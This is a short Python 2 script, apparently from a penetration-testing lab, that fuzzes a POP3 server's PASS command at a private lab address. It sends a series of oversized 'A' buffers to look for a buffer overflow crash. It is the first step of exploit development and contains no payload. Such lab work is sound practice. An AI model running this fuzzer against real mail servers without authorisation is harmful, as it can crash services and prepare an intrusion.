#!/usr/bin/python

import socket

# globals
host = '10.11.1.216'
port = 110


# Create an array of buffers

buffer=['A']
counter = 44500
while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter = counter+1

for string in buffer:
    print "Fuzzing PASS with %s bytes." % len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((host, port))
    r = s.recv(1024)
    r
    print r
    s.send('USER admin\r\n')
    r2=s.recv(1024)
    r2
    print r2
    s.send('PASS ' + string + '\r\n')
    print s.recv(1024)
    try:
        s.send('QUIT\r\n')
        s.close()
    except:
        print "..."

